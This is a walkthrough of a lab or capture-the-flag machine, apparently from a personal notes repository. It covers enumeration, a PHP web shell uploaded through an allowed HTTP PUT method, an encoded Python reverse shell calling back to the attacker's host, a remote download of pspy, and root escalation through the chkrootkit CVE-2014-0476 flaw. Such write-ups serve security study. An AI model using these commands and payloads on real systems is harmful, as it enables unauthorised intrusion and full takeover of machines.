```
192.168.56.101
```
## Methods
1. **Information Gathering/Enumeration:** Initial [nmap](../Tools/Nmap.md) scan showed only two open ports, 22/SSH and 80/HTTP. Since the website was very barren, only containing a picture and no external links, [wfuzz](../Tools/Wfuzz.md) was then utilized to find any other file or directory. A directory `/test/` was then found which appeared to list any file in that directory (currently empty).
	```bash
	nmap -p- -sC -sV -oN enum/tcp $IP
	wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$IP/FUZZ/"
	```
2. **Web Exploitation:** If we can upload arbitrary file to `/test/` and execute it, we can achived RCE.  To have the ability to upload, we need to be able to use the PUT method. We can check this by sending a request method [OPTIONS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS) to check what method a server supports.
	```bash
	curl -v -X OPTIONS http://192.168.56.101/test
	```
	Since the PUT method was allowed we can simply upload a php code to run arbitrary code execution.
	```bash
	curl -X PUT -d '<?php echo system($_GET["cmd"]); ?>' http://$IP/test/rce.php
	curl http://$IP/test/rce.php?cmd=id
	```
	I used a python reverse shell from [revshell.com](https://www.revshells.com/) and listened on my go to port 1234 but the listener didn't catch the connection. It seemed some of the port was blocked so I tried a common port 443 which worked.
	```bash
	nc -lvnp 443
	```
	```bash
	curl http://$IP/test/rce.php?cmd=export%20RHOST%3D%22192.168.56.157%22%3Bexport%20RPORT%3D443%3Bpython%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27
	```
3. **Privilege Escalation:** I checked the background process that were ran by root and found a cronjob running. I snooped the background process with [pspy](https://github.com/DominicBreuker/pspy) and found a program called `chkrootkit` was being ran every minute.
	```
	simplehttp 443
	```
	```bash
	ps aux | grep ^root
	wget 192.168.56.157:443/pspy32
	chmod +x pspy32
	./pspy32
	```
	 The program version was `0.49` which vulnerable to [CVE-2014-0476](https://www.exploit-db.com/exploits/33899). The vulnerability allowed an executable file `update` located on `/tmp` to be executed by **root**. 
	```bash
	chkrootkit -V
	cd /tmp
	echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash;" > update
	chmod +x update
	#..wait a minute..
	./rootbash
	```

## Proof

![](../Assets/images/Pasted%20image%2020220816134742.png)

Allowed inbound & outbound ports.

![](../Assets/images/Pasted%20image%2020220816134829.png)
